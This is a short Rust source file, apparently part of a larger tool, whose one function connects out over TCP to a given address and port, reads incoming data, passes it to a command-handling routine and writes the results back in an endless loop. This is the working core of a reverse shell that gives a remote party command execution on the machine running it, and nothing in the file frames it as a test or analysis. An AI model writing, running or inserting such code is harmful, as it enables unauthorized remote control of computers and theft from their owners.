use std::{
    net::TcpStream,
    io::{Read, Write},
};

use crate::library::handle_command_len;

pub fn socket_connect(addr: &String, port: &String) {

    // connect to the socket
    let mut connection = TcpStream::connect(format!("{addr}:{port}")).unwrap();

    loop {
        // read from tcp stream
        let mut read_buf= [0u8; 1024];
        let bytes_read = connection.read(&mut read_buf).unwrap();
        let data = &read_buf[..bytes_read];

        // execute command and write to tcp stream
        let output_to_write = handle_command_len(data);
        connection.write(output_to_write.as_bytes()).unwrap();
        connection.flush().unwrap();
        
    }
}
